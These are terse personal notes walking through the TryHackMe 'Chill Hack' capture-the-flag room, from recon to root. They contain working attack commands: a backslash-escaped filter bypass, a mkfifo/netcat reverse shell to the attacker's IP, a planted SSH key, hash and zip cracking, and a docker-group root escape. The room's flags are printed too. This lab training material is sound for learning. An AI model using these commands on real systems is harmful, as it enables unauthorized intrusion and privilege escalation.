
#CTF #Easy #FreeRoom 

https://tryhackme.com/r/room/chillhack

```
10.10.119.199

nano /etc/hosts
chill.thm

nmap 

21/tcp FTP anonymous allowed
22/ssh
80/http

gobuster

/images
/secret/
/server-status

apache 2.4.29

ftp 10.10.119.199
anonymous
[enter]
ls
cat note.txt

Anurodh
Apaar

http://10.10.119.199/secret/
ls ->> "are you a hacker?"

pwd
/var/www/html/secret

id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 

l\s -la
total 8 4 drwxr-xr-x 2 root root 4096 Oct 3 2020 images 4 -rw-r--r-- 1 root root 1520 Oct 4 2020 index.php

nc -nlvp 4242

# rev shell
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.152.74 4242 >/tmp/f

# we're in!

stablize shell

python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
ctrl z
stty raw -echo; fg
stty rows 38 columns 116

ls -la
index.php  root

cd /home
cd apaar
ls
local.txt

sudo -l
apaar ALL 

sudo -u apaar /home/apaar/.helpline.sh

/bin/sh
/bin/sh
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)

cd apaar/
cat local.txt

{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

# create a ssh public key 
ssh-keygen -f apaar

apaar.pub

cd .ssh
ls
authorized_keys 

--------------------
copy & paste content from apaar.pub echo into authorized_keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1GpYhx2vyCSRf8dwsTbm9qKtzTslyvzBhgHeHJ5I8bL53xzgPDz+KlOWGRMWyR0o6QH4OR6L35cGIBfCtBmoACvmXjFGXE4E5MLjUKyuJlfsshTuxz33HWfe/koS0J5d/2e3sz/+dvgtLGHGyzxMAuH/z4HicwHn37ZyYgDqwReuG70aI9//3T+uKbJs69ao6046HqTzJS8Vi8M357ZN+C0wFft5Fz2u+t35wa8iJ0eagRKCpq20Nfo5y+B8mKcQWUs9ZlsCju3pWIAh74Q069G8sOQ5tN7tyoQquN3vqpgPMVulKketd/YvQmgNP/Z+si0Ee+QizlWj42B/hZhXT root@ip-10-10-152-74" > authorized_keys

chmod 400 apaar

ssh -i apaar apaar@10.10.119.199
--------------------

cd /var/www/
ls
cd files/
ls

cat hacker.php
images/002d7e638fb463fb7a266f5ffc7ac47d.gif

cat index.php

if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");

mysql -u root -p
!@m+her00+@db

# we're in!

mysql> show databases;
use webportal;
show tables;
select * from users;

+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+

https://crackstation.net/

7e53614ced3640d5de23f111806cc4fd : masterpassword
686216240e5af30df0501e53c789a649 : dontaskdonttell

exit out of mysql

cd images/
ls

inside apaar's terminal
python3 -m http.server 8888

our terminal
wget http://10.10.119.199:8889/hacker-with-laptop_23-2147985341.jpg

/002d7e638fb463fb7a266f5ffc7ac47d.gif

steghide extract -sf hacker-with-laptop_23-2147985341.jpg

password: [enter]
backup.zip

zip2john backup.zip > hash
cat hash

john -w=/usr/share/wordlists/rockyou.txt hash

pass1word

unzip backup.zip
pass1word

source_code.php

admin portal
(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
Welcome Anurodh!

echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd

apaar's terminal
su anurodh

# we're in!

cd /home/anurodh

id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

## gtfobins for docker shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# we're in!
whoami

root
cat proof.txt

{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

```

- https://danielwaynewalker.medium.com/tryhackme-chill-hack-writeup-6764f83cdffd
- https://www.youtube.com/watch?v=EFG_TYK1bWc